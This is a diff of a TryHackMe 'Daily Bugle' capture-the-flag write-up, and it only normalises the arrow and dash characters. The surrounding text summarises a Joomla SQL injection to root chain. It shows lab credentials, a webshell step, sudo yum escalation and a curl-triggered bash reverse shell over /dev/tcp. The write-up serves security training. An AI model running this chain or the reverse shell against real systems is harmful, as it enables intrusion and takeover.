@@ -1,34 +1,34 @@
-# Daily Bugle â€” TryHackMe Writeup
+# Daily Bugle -- TryHackMe Writeup
 
 **Status:** WIP / pending full escalation documentation.
 **Target:** `TARGET_IP` (10.130.177.13 at time of solve)
 **OS:** Linux (CentOS)
 **Difficulty:** Hard
 **Tech stack:** Apache 2.4.6, PHP 5.6.40, Joomla 3.7.0, MariaDB
-**Exploit chain:** Joomla 3.7.0 `com_fields` SQLi (CVE-2017-8917) â†’ custom error-based dump â†’ `jonah:spiderman123` â†’ admin panel â†’ template webshell â†’ `www-data` shell â†’ `configuration.php` creds â†’ SSH as `jjameson` â†’ `sudo yum` plugin injection â†’ root
+**Exploit chain:** Joomla 3.7.0 `com_fields` SQLi (CVE-2017-8917) -> custom error-based dump -> `jonah:spiderman123` -> admin panel -> template webshell -> `www-data` shell -> `configuration.php` creds -> SSH as `jjameson` -> `sudo yum` plugin injection -> root
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap â†’ 22, 80 (Apache + Joomla), 3306 (MariaDB)
-    â†’
-curl /administrator/manifests/files/joomla.xml â†’ Joomla 3.7.0
-    â†’
-CVE-2017-8917 com_fields SQLi â†’ error-based extraction
-    â†’
-Custom Python script â†’ jonah : $2y$10$... (bcrypt)
-    â†’
-hashcat -m 3200 â†’ spiderman123
-    â†’
-Joomla admin â†’ template editor â†’ shell.php â†’ www-data
-    â†’
-configuration.php â†’ nv5uz9r3ZEDzVjNu â†’ SSH jjameson
-    â†’
-sudo -l â†’ (ALL) NOPASSWD: /usr/bin/yum
-    â†’
-yum plugin injection â†’ root shell â†’ root.txt
+nmap -> 22, 80 (Apache + Joomla), 3306 (MariaDB)
+    ->
+curl /administrator/manifests/files/joomla.xml -> Joomla 3.7.0
+    ->
+CVE-2017-8917 com_fields SQLi -> error-based extraction
+    ->
+Custom Python script -> jonah : $2y$10$... (bcrypt)
+    ->
+hashcat -m 3200 -> spiderman123
+    ->
+Joomla admin -> template editor -> shell.php -> www-data
+    ->
+configuration.php -> nv5uz9r3ZEDzVjNu -> SSH jjameson
+    ->
+sudo -l -> (ALL) NOPASSWD: /usr/bin/yum
+    ->
+yum plugin injection -> root shell -> root.txt
 ```
 
 ---
@@ -36,10 +36,10 @@ yum plugin injection â†’ root shell â†’ root.txt
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
 2. [Joomla Fingerprint](#2-joomla-fingerprint)
-3. [Initial Access â€” Joomla SQLi + Hash Crack](#3-initial-access--joomla-sqli--hash-crack)
+3. [Initial Access -- Joomla SQLi + Hash Crack](#3-initial-access--joomla-sqli--hash-crack)
 4. [Webshell via Template Editor](#4-webshell-via-template-editor)
-5. [User Pivot â€” Configuration.php Credentials](#5-user-pivot--configurationphp-credentials)
-6. [Privilege Escalation â€” sudo yum Plugin Injection](#6-privilege-escalation--sudo-yum-plugin-injection)
+5. [User Pivot -- Configuration.php Credentials](#5-user-pivot--configurationphp-credentials)
+6. [Privilege Escalation -- sudo yum Plugin Injection](#6-privilege-escalation--sudo-yum-plugin-injection)
 7. [Key Takeaways](#7-key-takeaways)
 
 ---
@@ -56,7 +56,7 @@ nmap -sVC -p22,80,3306 $TARGET -oN service
 | Port | Service |
 |------|---------|
 | 22/tcp | OpenSSH 7.4 |
-| 80/tcp | Apache 2.4.6 (CentOS) + PHP 5.6.40 â€” Joomla |
+| 80/tcp | Apache 2.4.6 (CentOS) + PHP 5.6.40 -- Joomla |
 | 3306/tcp | MariaDB (unauthorized) |
 
 See [nmap.md](../../../tools/recon/nmap.md).
@@ -80,7 +80,7 @@ Tools: [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/
 
 ---
 
-## 3. Initial Access â€” Joomla SQLi + Hash Crack
+## 3. Initial Access -- Joomla SQLi + Hash Crack
 
 Full technique: [joomla-com-fields-sqli.md](../../../exploits/web-rce/joomla-com-fields-sqli.md).
 
@@ -169,7 +169,7 @@ curl -g "http://$TARGET/templates/beez3/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/t
 
 ---
 
-## 5. User Pivot â€” Configuration.php Credentials
+## 5. User Pivot -- Configuration.php Credentials
 
 ```bash
 # What it does: read the Joomla configuration file.
@@ -193,7 +193,7 @@ sudo -l
 
 ---
 
-## 6. Privilege Escalation â€” sudo yum Plugin Injection
+## 6. Privilege Escalation -- sudo yum Plugin Injection
 
 Full technique: [yum-sudo-plugin-injection.md](../../../exploits/privesc-linux/yum-sudo-plugin-injection.md).
 
@@ -241,17 +241,17 @@ cat /root/root.txt
 
 ## 7. Key Takeaways
 
-- Joomla version fingerprinting via `/administrator/manifests/files/joomla.xml` is reliable and fast â€” always check before running heavy scanners.
+- Joomla version fingerprinting via `/administrator/manifests/files/joomla.xml` is reliable and fast -- always check before running heavy scanners.
 - CVE-2017-8917 (`com_fields` SQLi) is error-based and works without authentication. The `updatexml()` + `FLOOR(RAND(0)*2)` double-query pattern is the standard extraction primitive.
 - Joomla template editors (like WordPress theme editors) give direct RCE when you have admin access. Always check the template manager after gaining CMS credentials.
 - `configuration.php` in Joomla (like `wp-config.php` in WordPress) leaks database credentials that are frequently reused for SSH.
-- `sudo yum` is a GTFOBins classic â€” the plugin system allows arbitrary Python execution under the calling user's privileges.
+- `sudo yum` is a GTFOBins classic -- the plugin system allows arbitrary Python execution under the calling user's privileges.
 
 ---
 
 ## Related Notes
-- [joomla-com-fields-sqli.md](../../../exploits/web-rce/joomla-com-fields-sqli.md) â€” initial access
-- [joomla-template-editor-webshell.md](../../../exploits/web-rce/joomla-template-editor-webshell.md) â€” RCE chain
-- [yum-sudo-plugin-injection.md](../../../exploits/privesc-linux/yum-sudo-plugin-injection.md) â€” root privesc
-- [linux-enumeration.md](../../../exploits/enumeration/linux-enumeration.md) â€” playbook backbone
+- [joomla-com-fields-sqli.md](../../../exploits/web-rce/joomla-com-fields-sqli.md) -- initial access
+- [joomla-template-editor-webshell.md](../../../exploits/web-rce/joomla-template-editor-webshell.md) -- RCE chain
+- [yum-sudo-plugin-injection.md](../../../exploits/privesc-linux/yum-sudo-plugin-injection.md) -- root privesc
+- [linux-enumeration.md](../../../exploits/enumeration/linux-enumeration.md) -- playbook backbone
 - [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/web/curl.md), [hashcat](../../../tools/creds/hashcat.md)
